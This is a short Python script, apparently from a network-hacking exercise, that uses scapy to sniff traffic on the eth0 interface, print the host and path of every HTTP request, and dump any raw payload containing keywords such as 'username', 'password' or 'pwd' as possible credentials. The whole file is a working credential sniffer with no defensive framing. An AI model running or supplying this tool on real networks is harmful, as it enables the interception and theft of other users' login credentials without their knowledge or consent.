#!/usr/bin/env python
import scapy.all as sc
from scapy.layers import http

def sniff(interface):
	#For each packet captured, execute the process_packet function (via prn)
	#Store decides whether to store  packets in memory.
	sc.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(sc.Raw):
		load = str(packet[sc.Raw].load)
		keywords = ["username", "Username", "login", "password", "Password", "Uname", "uname", "pwd", "PWD", "Pwd"]
		for k in keywords:
			if k in load:
				return load

def process_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		#print(packet.show())
		url = get_url(packet)
		print("[+] URLS: ============================================")
		print(url.decode())
		load_layer = get_login_info(packet)
		if load_layer:
			print("\n\n[+] Possible Usernames and Passwords: =======")
			print(load_layer + "\n")
					
sniff("eth0")
